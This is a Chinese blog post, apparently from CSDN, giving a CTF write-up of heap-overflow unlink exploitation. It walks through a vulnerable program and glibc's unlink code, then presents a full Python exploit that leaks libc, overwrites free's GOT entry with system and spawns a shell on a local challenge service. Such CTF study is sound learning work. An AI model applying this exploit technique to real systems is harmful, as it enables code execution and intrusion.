@@ -1,0 +1,293 @@
+<div class="blog-content-box">
+ <div class="article-title-box">
+  <span class="article-type type-1 float-left">
+   原
+  </span>
+  <h1 class="title-article">
+   CTF之堆溢出-unlink原理探究
+  </h1>
+ </div>
+ <div class="article-info-box">
+  <div class="article-bar-top d-flex">
+   <span class="time">
+    2017年06月12日 23:45:14
+   </span>
+   <div class="float-right">
+    <span class="read-count">
+     阅读数：2733
+    </span>
+   </div>
+  </div>
+ </div>
+ <article>
+  <div class="article_content clearfix csdn-tracking-statistics" data-dsm="post" data-mod="popu_307" data-pid="blog" id="article_content">
+   <div class="markdown_views">
+    <hr/>
+    <p>
+     来干！来干！
+     <br/>
+     转战堆溢出，这东东确实接触的很少，听说很神奇很细腻。我也是初次接触就和大家一起共同学习下，也填补下这方面的空白。
+    </p>
+    <blockquote>
+     <p>
+      <a href="https://sploitfun.wordpress.com/2015/02/26/heap-overflow-using-unlink/" rel="nofollow" target="_blank">
+       https://sploitfun.wordpress.com/2015/02/26/heap-overflow-using-unlink/
+      </a>
+     </p>
+    </blockquote>
+    <p>
+     这篇文章讲的就是堆溢出的原理，不过全是英文，估计。。。慢慢看，不急。我就结合着它给的示例程序来分析下原理，以及如何利用堆溢出。如有不妥之处，还望及时批评指正！
+    </p>
+    <pre class="prettyprint"><code class=" hljs cpp"><span class="hljs-comment">/* 
+ Heap overflow vulnerable program. 
+ */</span>
+<span class="hljs-preprocessor">#include &lt;stdlib.h&gt;</span>
+<span class="hljs-preprocessor">#include &lt;string.h&gt;</span>
+
+<span class="hljs-keyword">int</span> main( <span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> * argv[] )
+{
+        <span class="hljs-keyword">char</span> * first, * second;
+
+<span class="hljs-comment">/*[1]*/</span> first = <span class="hljs-built_in">malloc</span>( <span class="hljs-number">666</span> );
+<span class="hljs-comment">/*[2]*/</span> second = <span class="hljs-built_in">malloc</span>( <span class="hljs-number">12</span> );
+        <span class="hljs-keyword">if</span>(argc!=<span class="hljs-number">1</span>)
+<span class="hljs-comment">/*[3]*/</span>         <span class="hljs-built_in">strcpy</span>( first, argv[<span class="hljs-number">1</span>] );
+<span class="hljs-comment">/*[4]*/</span> <span class="hljs-built_in">free</span>( first );
+<span class="hljs-comment">/*[5]*/</span> <span class="hljs-built_in">free</span>( second );
+<span class="hljs-comment">/*[6]*/</span> <span class="hljs-keyword">return</span>( <span class="hljs-number">0</span> );
+}</code></pre>
+    <p>
+     这就是存在堆溢出的程序了，很明显好不啦。
+    </p>
+    <p>
+     堆确实很难。整了好久没整出来。多亏了在师傅的帮助下，终于把unlink给整明白了。(为了记录下学习的过程，前面的内容我就不删了)
+    </p>
+    <p>
+     先来推荐几篇文章，主要是看一下原理，虽然我知道即使看懂了，但是利用它时还是一脸懵比。
+    </p>
+    <blockquote>
+     <p>
+      <a href="http://www.freebuf.com/news/88660.html" rel="nofollow" target="_blank">
+       http://www.freebuf.com/news/88660.html
+      </a>
+     </p>
+     <p>
+      <a href="http://www.freebuf.com/vuls/98404.html" rel="nofollow" target="_blank">
+       http://www.freebuf.com/vuls/98404.html
+      </a>
+     </p>
+    </blockquote>
+    <p>
+     这是一道很经典的unlink，希望从此叩开堆溢出的大门(需要程序的在下方留个言)
+     <br/>
+     由于调试堆的题目需要注意很多细节，而这些细节对于一个有栈经验的选手来说应该不难懂，所以我就不会说的太明白。我主要是分析一下unlink那块代码。
+     <br/>
+     按着我的习惯，先检查一下。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170612234134594?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     和堆有关的保护我也不清楚 ，我就不班门弄斧了。
+     <br/>
+     试运行一下程序。这种结构很明显是个堆题。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170612234150145?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     IDA反汇编。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170612234158125?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     这里和大家说一个IDA使用的小技巧，遇到堆题先逆向，将一些函数按他的功能rename一下，这样调理会清楚点，而且我们要知道每个选项具体都做了什么，堆题的利用往往会涉及到很多知识点。改完之后另存为i64文件，这样下次再调试的时候，就会方便很多。上面是我已经rename之后的了。
+     <br/>
+     我们知道要想unlink就必须让堆进行合并，那么我们就需要精心的构造堆块，说这道题经典因为这题没有在溢出这些方面做手脚，基本上堆块我们可以随意的构造溢出。
+     <br/>
+     首先new三次。我们可以看看linux是如何管理堆的。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170612234209177?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     这是第一次malloc的结果。
+     <br/>
+     再来看看第二次malloc，我们同样是
+     <code>
+      malloc0xa0
+     </code>
+     字节
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170612234217318?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170612234225802?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     了解完malloc之后，再来了解一下free。我在这里edit第一个块使其溢出，再释放第二个块。
+     <br/>
+     可以看到修改后的第二块如下。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170612234304412?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     我们需要进到free函数里面看看，找到unlink部分。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170612234312069?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     就是这段代码，关键的unlink操作。首先他会进行一些判断，看是否需要进行unlink，这就是为什么我们需要对堆进行构造了。
+     <br/>
+     <code>
+      test    byte ptr [rbx+8], 1
+     </code>
+     用于判断flag是否为1。
+     <br/>
+     其中几个关键的cmp是构造时需要 注意的。
+    </p>
+    <pre class="prettyprint"><code class=" hljs css"><span class="hljs-tag">mov</span>     <span class="hljs-attr_selector">[rax+18h]</span>, <span class="hljs-tag">rdx</span>
+<span class="hljs-tag">mov</span>     <span class="hljs-attr_selector">[rdx+10h]</span>, <span class="hljs-tag">rax</span></code></pre>
+    <p>
+     还有这两句关键的mov是任意地址写的关键。这一段代码一定要自己好好地调试一下，对照着原理。这里我就不写了。
+     <br/>
+     当我们将堆指针覆盖之后(这里直接这么恐怕有的人会很糊涂，不过我真的很难去解释，先把疑问留着，等会就知道干什么了)
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170612234421367?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     再执行edit。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170612234429408?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     这时候
+     <code>
+      my_read
+     </code>
+     就会往我所修改的位置写入
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170612234436549?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+     <br/>
+     我就是要往堆指针进行写入，这样我就可以控制每个堆块的flag，size以及对应的堆指针了。
+     <br/>
+     在调用一次list，将free的libc地址泄露，求偏移算得
+     <code>
+      system_addr
+     </code>
+     .。在接下来就是edit，将
+     <code>
+      system_addr
+     </code>
+     写入到
+     <code>
+      free_got.plt
+     </code>
+     。以便在下次调用free时执行。
+     <br/>
+     最后不知道怎么回事。就是拿不到shell。好像是system的地址错了，但是我已经泄露了free的地址了，根据偏移应该可以得到system的地址了。希望大神能纠正下我的错误。
+     <br/>
+     最后还是贴上exp：
+    </p>
+    <pre class="prettyprint"><code class=" hljs lua">from zio import*
+target=(<span class="hljs-string">'127.0.0.1'</span>,<span class="hljs-number">10000</span>)
+<span class="hljs-built_in">io</span>=zio(target,timeout=<span class="hljs-number">10000</span>,print_read=COLORED(RAW,<span class="hljs-string">'red'</span>),print_write=COLORED(RAW,<span class="hljs-string">'green'</span>))
+c2=raw_input(<span class="hljs-string">'go?'</span>)
+#new
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">'&gt;'</span>)
+<span class="hljs-built_in">io</span>.writeline(<span class="hljs-string">'2'</span>)
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">':'</span>)
+<span class="hljs-built_in">io</span>.writeline(<span class="hljs-string">'160'</span>)
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">':'</span>)
+<span class="hljs-built_in">io</span>.writeline(<span class="hljs-string">'a'</span>*<span class="hljs-number">0xa0</span>)
+#new
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">'&gt;'</span>)
+<span class="hljs-built_in">io</span>.writeline(<span class="hljs-string">'2'</span>)
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">':'</span>)
+<span class="hljs-built_in">io</span>.writeline(<span class="hljs-string">'160'</span>)
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">':'</span>)
+<span class="hljs-built_in">io</span>.writeline(<span class="hljs-string">'b'</span>*<span class="hljs-number">0xa0</span>)
+#new
+payload=<span class="hljs-string">'/bin/sh\x00'</span>+<span class="hljs-string">'c'</span>*<span class="hljs-number">0x98</span>
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">'&gt;'</span>)
+<span class="hljs-built_in">io</span>.writeline(<span class="hljs-string">'2'</span>)
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">':'</span>)
+<span class="hljs-built_in">io</span>.writeline(<span class="hljs-string">'160'</span>)
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">':'</span>)
+<span class="hljs-built_in">io</span>.writeline(payload)
+#edit
+payload=l64(<span class="hljs-number">0x00</span>)+l64(<span class="hljs-number">0x00</span>)+l64(<span class="hljs-number">0x06016d0</span>)+l64(<span class="hljs-number">0x06016d8</span>)+<span class="hljs-string">'a'</span>*<span class="hljs-number">0x80</span>+l64(<span class="hljs-number">0xa0</span>)+l64(<span class="hljs-number">0xb0</span>)
+#payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">0xa0</span>
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">'&gt;'</span>)
+<span class="hljs-built_in">io</span>.writeline(<span class="hljs-string">'3'</span>)
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">':'</span>)
+<span class="hljs-built_in">io</span>.writeline(<span class="hljs-string">'1'</span>)
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">':'</span>)
+<span class="hljs-built_in">io</span>.writeline(<span class="hljs-string">'176'</span>)
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">':'</span>)
+<span class="hljs-built_in">io</span>.writeline(payload)
+#delete
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">'&gt;'</span>)
+<span class="hljs-built_in">io</span>.writeline(<span class="hljs-string">'4'</span>)
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">':'</span>)
+<span class="hljs-built_in">io</span>.writeline(<span class="hljs-string">'2'</span>)
+#edit
+free_got = <span class="hljs-number">0x0000000000601600</span>
+payload=l64(free_got)+l64(<span class="hljs-number">0x1</span>)+l64(<span class="hljs-number">0xa0</span>)+l64(free_got)+l64(<span class="hljs-number">0x1</span>)
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">'&gt;'</span>)
+<span class="hljs-built_in">io</span>.writeline(<span class="hljs-string">'3'</span>)
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">':'</span>)
+<span class="hljs-built_in">io</span>.writeline(<span class="hljs-string">'1'</span>)
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">':'</span>)
+<span class="hljs-built_in">io</span>.writeline(<span class="hljs-string">'40'</span>)
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">':'</span>)
+<span class="hljs-built_in">io</span>.writeline(payload)
+#list_free_addr
+#free_addr = list_sc(<span class="hljs-built_in">io</span>)
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">'&gt;'</span>)
+<span class="hljs-built_in">io</span>.writeline(<span class="hljs-string">'1'</span>)
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">'SHELLC0DE 0: '</span>)
+free_addr=l64(<span class="hljs-built_in">io</span>.read(<span class="hljs-number">16</span>).decode(<span class="hljs-string">'hex'</span>))
+<span class="hljs-built_in">print</span> hex(free_addr)
+#edit_system
+libc_base = free_addr - <span class="hljs-number">0x0000000000082DF0</span>
+system_addr = libc_base + <span class="hljs-number">0x0000000000046640</span>
+#system_addr=free_addr+<span class="hljs-number">0x271D0</span>
+<span class="hljs-built_in">print</span> hex(libc_base)
+<span class="hljs-built_in">print</span> hex(system_addr)
+payload=l64(system_addr)
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">'&gt;'</span>)
+<span class="hljs-built_in">io</span>.writeline(<span class="hljs-string">'3'</span>)
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">':'</span>)
+<span class="hljs-built_in">io</span>.writeline(<span class="hljs-string">'1'</span>)
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">':'</span>)
+<span class="hljs-built_in">io</span>.writeline(<span class="hljs-string">'8'</span>)
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">':'</span>)
+<span class="hljs-built_in">io</span>.writeline(payload)
+#get shell
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">'&gt;'</span>)
+<span class="hljs-built_in">io</span>.writeline(<span class="hljs-string">'4'</span>)
+<span class="hljs-built_in">io</span>.read_until(<span class="hljs-string">':'</span>)
+<span class="hljs-built_in">io</span>.writeline(<span class="hljs-string">'2'</span>)
+
+<span class="hljs-built_in">io</span>.interact()</code></pre>
+    <hr/>
+    <p>
+     好吧！一语惊醒梦中人，cfree和free原来不是一个函数，最后求得的libc_base错了。本地调试改正后拿到shell。
+     <br/>
+     <img alt="这里写图片描述" src="https://img-blog.csdn.net/20170615125734147?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzM0Mzg3MzM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/>
+    </p>
+   </div>
+   <link href="https://csdnimg.cn/release/phoenix/template/css/markdown_views-ea0013b516.css" rel="stylesheet"/>
+  </div>
+  <div class="hide-article-box text-center csdn-tracking-statistics tracking-click" data-mod="popu_376">
+   <a class="btn btn-red-hollow" id="btn-readmore">
+    阅读更多
+   </a>
+  </div>
+ </article>
+ <div class="article-bar-bottom">
+  <div class="article-copyright">
+   版权声明：本文为博主原创文章，未经博主允许不得转载。			https://blog.csdn.net/qq_33438733/article/details/73149417
+  </div>
+  <div class="tags-box">
+   <span class="label">
+    个人分类：
+   </span>
+   <a class="tag-link" href="https://blog.csdn.net/qq_33438733/article/category/6925810" target="_blank">
+    PWN
+   </a>
+   <a class="tag-link" href="https://blog.csdn.net/qq_33438733/article/category/6945018" target="_blank">
+    CTF
+   </a>
+  </div>
+ </div>
+ <!-- !empty($pre_next_article[0]) -->
+</div>
